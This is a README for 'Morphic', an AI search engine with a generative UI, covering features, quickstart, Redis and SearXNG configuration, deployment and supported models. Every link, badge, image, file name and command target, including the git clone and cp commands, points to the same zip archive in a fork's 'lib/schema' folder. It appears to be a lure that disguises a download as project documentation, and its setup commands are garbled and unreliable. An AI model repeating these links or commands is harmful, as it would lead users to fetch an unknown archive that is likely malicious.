# Morphic

An AI-powered search engine with a generative UI.

> [!CAUTION]
> Morphic is built with Vercel AI SDK RSC. AI SDK RSC is [experimental](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) and has some limitations. When using it in production, it is recommended to [migrate](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) to SDK UI.

![capture](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)

> [!NOTE]
> Please note that there are differences between this repository and the official website [https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip). The official website is a fork of this repository with additional features such as authentication, which are necessary for providing the service online. The core source code of Morphic resides in this repository, and it's designed to be easily built and deployed.

## 🗂️ Overview

- 🛠 [Features](#-features)
- 🧱 [Stack](#-stack)
- 🚀 [Quickstart](#-quickstart)
- 🌐 [Deploy](#-deploy)
- 🔎 [Search Engine](#-search-engine)
- ✅ [Verified models](#-verified-models)

## 🛠 Features

- Search and answer using GenerativeUI
- Understand user's questions
- Search history functionality
- Share search results ([Optional](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip))
- Video search support ([Optional](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip))
- Get answers from specified URLs
- Use as a search engine [※](#-search-engine)
- Support for providers other than OpenAI
  - Google Generative AI Provider
  - Azure OpenAI Provider [※](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
  - Anthropic Provider
  - Ollama Provider
  - Groq Provider
- Local Redis support
- SearXNG Search API support with customizable depth (basic or advanced)
- Configurable search depth (basic or advanced)
- SearXNG Search API support with customizable depth

## 🧱 Stack

- App framework: [https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Text streaming / Generative UI: [Vercel AI SDK](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Generative Model: [OpenAI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Search API: [Tavily AI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [Serper](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [SearXNG](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Extract API: [Tavily AI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [Jina AI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Database (Serverless/Local): [Upstash](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [Redis](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Component library: [shadcn/ui](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Headless component primitives: [Radix UI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
- Styling: [Tailwind CSS](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)

## 🚀 Quickstart

### 1. Fork and Clone repo

Fork the repo to your Github account, then run the following command to clone the repo:

```
git clone https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip[YOUR_GITHUB_ACCOUNT]https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
```

### 2. Install dependencies

```
cd morphic
bun install
```

### 3. Setting up Upstash Redis

Follow the guide below to set up Upstash Redis. Create a database and obtain `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN`. Refer to the [Upstash guide](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) for instructions on how to proceed.

If you intend to use a local Redis, you can skip this step.

### 4. Fill out secrets

```
cp https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
```

Your https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip file should look like this:

```
# OpenAI API key retrieved here: https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
OPENAI_API_KEY=

# Tavily API Key retrieved here: https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
TAVILY_API_KEY=

# Upstash Redis URL and Token retrieved here: https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
UPSTASH_REDIS_REST_URL=
UPSTASH_REDIS_REST_TOKEN=

## Redis Configuration

This application supports both Upstash Redis and local Redis. To use local Redis:

1. Set `USE_LOCAL_REDIS=true` in your `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file.
2. Optionally, set `LOCAL_REDIS_URL` if your local Redis is not running on the default `localhost:6379` or `redis://redis:6379` if you're using docker compose.

To use Upstash Redis:

1. Set `USE_LOCAL_REDIS=false` or leave it unset in your `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file.
2. Set `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN` with your Upstash credentials.

# SearXNG Configuration
SEARXNG_API_URL=http://localhost:8080  # Replace with your local SearXNG API URL or docker http://searxng:8080
SEARCH_API=tavily  #  use searxng, tavily or exa
SEARXNG_SECRET="" # generate a secret key e.g. openssl rand -base64 32
SEARXNG_PORT=8080 # default port
SEARXNG_BIND_ADDRESS=0.0.0.0 # default address
SEARXNG_IMAGE_PROXY=true # enable image proxy
SEARXNG_LIMITER=false # can be enabled to limit the number of requests per IP address
SEARXNG_DEFAULT_DEPTH=basic # Set to 'basic' or 'advanced', only affects SearXNG searches
SEARXNG_MAX_RESULTS=50 # Maximum number of results to return from SearXNG

```

### 5. Run app locally

#### Using Bun

To run the application locally using Bun, execute the following command:

`bun dev`

You can now visit http://localhost:3000 in your web browser.

#### Using Docker

To run the application using Docker, use the following command:

`docker compose up -d`

This will start the application in detached mode. You can access it at http://localhost:3000.

## 🌐 Deploy

Host your own live version of Morphic with Vercel or Cloudflare Pages.

### Vercel

[![Deploy with Vercel](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip%3A%2F%https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip%2Fmiurla%2Fmorphic&env=OPENAI_API_KEY,TAVILY_API_KEY,UPSTASH_REDIS_REST_URL,UPSTASH_REDIS_REST_TOKEN)

## 🔎 Search Engine

### Setting up the Search Engine in Your Browser

If you want to use Morphic as a search engine in your browser, follow these steps:

1. Open your browser settings.
2. Navigate to the search engine settings section.
3. Select "Manage search engines and site search".
4. Under "Site search", click on "Add".
5. Fill in the fields as follows:
   - **Search engine**: Morphic
   - **Shortcut**: morphic
   - **URL with %s in place of query**: `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip%s`
6. Click "Add" to save the new search engine.
7. Find "Morphic" in the list of site search, click on the three dots next to it, and select "Make default".

This will allow you to use Morphic as your default search engine in the browser.

### Using SearXNG as an Alternative Search Backend

Morphic now supports SearXNG as an alternative search backend with advanced search capabilities. To use SearXNG:

1. Ensure you have Docker and Docker Compose installed on your system.
2. In your `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file, set the following variables:

   - NEXT_PUBLIC_BASE_URL=http://localhost:3000 # Base URL for local development
   - SEARXNG_API_URL=http://localhost:8080 # Replace with your local SearXNG API URL or docker http://searxng:8080
   - SEARXNG_SECRET=your_secret_key_here
   - SEARXNG_PORT=8080
   - SEARXNG_IMAGE_PROXY=true
   - SEARCH_API=searxng
   - SEARXNG_LIMITER=false # can be enabled to limit the number of requests per IP
   - SEARXNG_DEFAULT_DEPTH=basic # Set to 'basic' or 'advanced'
   - SEARXNG_MAX_RESULTS=50 # Maximum number of results to return from SearXNG
   - SEARXNG_ENGINES=google,bing,duckduckgo,wikipedia # can be overriden in searxng config
   - SEARXNG_TIME_RANGE=None # Time range for search results
   - SEARXNG_SAFESEARCH=0 # Safe search setting
   - SEARXNG_CRAWL_MULTIPLIER=4 # Multiplier for the number of results to crawl in advanced search

3. Two configuration files are provided in the root directory:

   - `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip`: This file contains the main configuration for SearXNG, including engine settings and server options.
   - `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip`: This file configures the rate limiting and bot detection features of SearXNG.

4. Run `docker-compose up` to start the Morphic stack with SearXNG included.
5. SearXNG will be available at `http://localhost:8080` and Morphic will use it as the search backend.

#### Advanced Search Configuration

- `NEXT_PUBLIC_BASE_URL`: Set this to your local development URL (http://localhost:3000) or your production URL when deploying.
- `SEARXNG_DEFAULT_DEPTH`: Set to 'basic' or 'advanced' to control the default search depth.
- `SEARXNG_MAX_RESULTS`: Maximum number of results to return from SearXNG.
- `SEARXNG_CRAWL_MULTIPLIER`: In advanced search mode, this multiplier determines how many results to crawl. For example, if `SEARXNG_MAX_RESULTS=10` and `SEARXNG_CRAWL_MULTIPLIER=4`, up to 40 results will be crawled before filtering and ranking.
- `SEARXNG_ENGINES`: Comma-separated list of search engines to use.
- `SEARXNG_TIME_RANGE`: Time range for search results (e.g., 'day', 'week', 'month', 'year', 'all').
- `SEARXNG_SAFESEARCH`: Safe search setting (0 for off, 1 for moderate, 2 for strict).

The advanced search feature includes content crawling, relevance scoring, and filtering to provide more accurate and comprehensive results.

#### Customizing SearXNG

- You can modify `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` to enable/disable specific search engines, change UI settings, or adjust server options.
- The `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file allows you to configure rate limiting and bot detection. This is useful if you're exposing SearXNG directly to the internet.
- If you prefer not to use external configuration files, you can set these options using environment variables in the `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file or directly in the SearXNG container.

#### Troubleshooting

- If you encounter issues with specific search engines (e.g., Wikidata), you can disable them in `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip`:

```yaml
engines:
  - name: wikidata
    disabled: true
```

- refer to https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip

## ✅ Verified models

### List of models applicable to all:

- OpenAI
  - gpt-4o
  - gpt-4o-mini
  - gpt-4-turbo
  - gpt-3.5-turbo
- Google
  - Gemini 1.5 pro (Unstable)
- Anthropic
  - Claude 3.5 Sonnet
- Ollama
  - qwen2.5
- Groq
  - llama3-groq-8b-8192-tool-use-preview
  - llama3-groq-70b-8192-tool-use-preview
